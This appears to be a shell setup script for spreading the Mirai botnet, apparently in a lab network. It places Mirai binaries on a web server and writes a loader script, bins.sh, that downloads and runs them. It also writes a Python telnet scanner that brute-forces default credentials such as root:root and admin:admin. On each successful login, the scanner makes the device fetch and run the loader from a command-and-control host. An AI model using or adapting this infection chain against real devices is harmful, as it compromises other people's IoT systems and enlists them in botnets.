mkdir /var/www/html/bins
cp /home/debug/mirai* /var/www/html/bins

echo "#!/bin/sh
 
WEBSERVER=\"192.168.10.10:80\"
 
 
BINARIES=\"mirai.i586 mirai.x86 mirai.dbg\"
 
wget http://\$WEBSERVER/bins/scanner.py -O scanner.py
for Binary in \$BINARIES; do
    wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done" > /var/www/html/bins/bins.sh

echo 'import telnetlib

addresses = ["192.168.10.6", "192.168.10.7", "192.168.10.8", "192.168.10.9", "192.168.10.10"]

credentials = [
    "root:root",
    "admin:admin",
    "guest:guest",
    "user:user",
    "root:admin",
    "admin:root",
    "root:root123"
]
connections = []

for ip in addresses:
    invalid_usernames = []
    valid_pairs = []
    for c in credentials:
        tn = telnetlib.Telnet()
        user,password = c.split(":")
        if user in invalid_usernames:
            continue
        try:
            tn.open(ip)
        except Exception as e:
            continue
        tn.read_until(b"login: ")
        tn.write(user.encode("ascii")+b"\\n")
        response = tn.read_until(b"Password: ", timeout=1)
        if b"Password" not in response:
            invalid_usernames.append(user)
            tn.close()
            continue
        tn.write(password.encode("ascii")+b"\\n")
        response = tn.read_until(b"$", timeout=1)
        if b"$" not in response:
            tn.close()
            continue
        print(response)
        valid_pairs.append(c)
        tn.write(b"wget mirai-cnc/bins/bins.sh | sh\\n")
        response = tn.read_until(b"$", timeout=2)
        tn.write(b"chmod +x bins.sh\\n")
        tn.write(b"nohup ./bins.sh\\n")
        response = tn.read_until(b"Connected", timeout=5)
        connections.append(tn)
' > /var/www/html/bins/scanner.py